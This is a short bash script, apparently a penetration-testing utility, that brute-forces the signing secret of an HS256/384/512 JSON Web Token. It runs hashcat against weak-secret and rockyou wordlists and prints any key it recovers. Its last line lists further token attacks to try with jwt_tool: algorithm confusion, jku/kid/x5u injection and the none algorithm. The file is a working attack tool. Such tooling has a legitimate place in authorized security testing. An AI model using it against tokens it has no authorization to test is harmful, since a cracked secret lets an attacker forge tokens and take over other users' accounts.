#!/usr/bin/env bash
# Usage (WSL): tools/jwt_crack.sh <jwt-token> [extra wordlist]
# Cracks HS256/384/512 secret with hashcat mode 16500 (fast; ~seconds-minutes on a wordlist).
# Tries: ~/wordlists/jwt-secrets.txt (104k known weak secrets) then rockyou.txt, then optional extra list.
tok="$1"; extra="$2"
[ -z "$tok" ] && { echo "usage: $0 <jwt> [wordlist]"; exit 1; }
echo "$tok" > /tmp/jwt.txt
for wl in ~/wordlists/jwt-secrets.txt /usr/share/wordlists/rockyou.txt "$extra"; do
  [ -z "$wl" ] && continue
  [ -f "$wl" ] || continue
  echo "== trying $wl"
  hashcat -m 16500 -a 0 /tmp/jwt.txt "$wl" --potfile-disable -o /tmp/jwt.cracked --force 2>&1 | tail -5
  if [ -s /tmp/jwt.cracked ]; then echo "SECRET FOUND:"; cat /tmp/jwt.cracked; exit 0; fi
done
echo "not found in standard lists - inspect jwt_tool (~/jwt_tool/jwt_tool.py -t) for alg confusion (RS256->HS256), jku/kid/x5u injection, none-alg, etc."
